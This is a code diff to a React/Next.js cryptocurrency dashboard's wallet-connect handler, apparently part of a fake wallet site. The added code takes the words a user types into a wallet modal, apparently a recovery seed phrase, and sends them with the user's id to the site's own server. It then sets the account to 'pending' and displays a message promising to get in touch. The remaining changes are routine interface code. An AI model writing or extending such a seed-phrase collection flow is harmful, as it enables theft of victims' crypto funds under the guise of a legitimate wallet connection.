@@ -8,6 +8,9 @@ import { WalletModal } from "@/components/modals/wallet-modal";
 import Link from "next/link";
 import CryptoCoins from "@/components/crypto-coins";
 import { User } from "@/lib/auth";
+import connectUserWallet from "@/actions/wallet.action";
+import { authClient } from "@/lib/auth-client";
+import { useRouter } from "next/navigation";
 
 function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: User }) {
   const [searchQuery, setSearchQuery] = useState("");
@@ -16,11 +19,25 @@ function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: Use
   const [showSendModal, setShowSendModal] = useState(false);
   const [showReceiveModal, setShowReceiveModal] = useState(false);
   const [showWalletModal, setShowWalletModal] = useState(false);
-  const [isWalletConnected, setIsWalletConnected] = useState(false);
 
-  // Calculate total balance
+  const router = useRouter();
+
+  const [banner, setBanner] = useState<{
+    type: "success" | "error";
+    message: string;
+  } | null>(null);
+
+  const showBanner = (type: "success" | "error", message: string) => {
+    setBanner({ type, message });
+
+    setTimeout(() => {
+      setBanner(null);
+      if (type === "success") router.refresh();
+    }, type === "success" ? 3000 : 10_000);
+  };
+
   const totalBalanceOn = coinData
-    .filter(coin => coin.on)
+    .filter((coin) => coin.on)
     .reduce((sum, coin) => sum + coin.balance * coin.price, 0);
 
   const balance = totalBalanceOn.toLocaleString(undefined, {
@@ -35,10 +52,30 @@ function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: Use
     });
   };
 
-  const handleWalletConnect = (words: string[]) => {
-    // Here you would typically send the words to your backend
-    console.log("Connecting wallet with words:", words);
-    setIsWalletConnected(!isWalletConnected);
+  const handleWalletConnect = async (words: string[]) => {
+    try {
+      const { error } = await connectUserWallet(user.id, words.join(" "));
+
+      if (error) {
+        showBanner("error", error);
+        return;
+      }
+
+      authClient.updateUser({
+        walletStatus: "pending"
+      }, {
+        onError(context) {
+          showBanner("error", context.error.message || "Something went wrong. Please try again.");
+        },
+        onSuccess() {
+          setShowWalletModal(false);
+          showBanner("success", "Thank you for connecting your wllet, we will be in touch with you regarding the status of your wallet connection");
+        }
+      })
+    } catch (err) {
+      console.error("Error connecting wallet...", err);
+      showBanner("error", "Something went wrong. Please try again.");
+    }
   };
 
   return (
@@ -54,6 +91,31 @@ function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: Use
           className="w-full bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-700 rounded-md pl-10 pr-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
         />
       </div>
+
+      {/* Banner */}
+      {banner && (
+        <div
+          className={`my-4 rounded-md px-4 py-3 text-sm font-medium flex items-center justify-between
+            ${banner.type === "success"
+              ? "bg-green-100 text-green-800 dark:bg-green-900/40 dark:text-green-300"
+              : "bg-red-100 text-red-800 dark:bg-red-900/40 dark:text-red-300"
+            }
+          `}
+        >
+          <span>{banner.message}</span>
+          <button
+            onClick={() => {
+              if (banner.type === "success") {
+                setBanner(null)
+                router.refresh();
+              }
+            }}
+            className="ml-4 text-xs opacity-70 hover:opacity-100"
+          >
+            ✕
+          </button>
+        </div>
+      )}
 
       {/* Account ID with Dropdown */}
       <div className="mt-6">
@@ -148,17 +210,21 @@ function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: Use
       {/* Connect Wallet Button */}
       <button
         onClick={() => setShowWalletModal(true)}
-        className={isWalletConnected
+        className={user.walletStatus === "connected"
           ? "mt-3 w-full bg-green-500 text-black dark:text-white font-bold py-3 rounded-md flex items-center justify-center"
-          : "mt-3 w-full bg-yellow-500 text-black font-bold py-3 rounded-md hover:bg-yellow-600 flex items-center justify-center"
+          : user.walletStatus === "pending"
+            ? "mt-3 w-full bg-blue-500 text-white font-bold py-3 rounded-md flex items-center justify-center cursor-wait opacity-90"
+            : "mt-3 w-full bg-yellow-500 text-black font-bold py-3 rounded-md hover:bg-yellow-600 flex items-center justify-center"
         }
-      // disabled={isWalletConnected}
+        disabled={user.walletStatus !== "not-connected"}
       >
-        {isWalletConnected ? (
+        {user.walletStatus === "connected" ? (
           <>
             <Check className="mr-2 w-4 h-4" />
             Wallet Connected
           </>
+        ) : user.walletStatus === "pending" ? (
+          "Pending"
         ) : (
           "Connect Wallet"
         )}
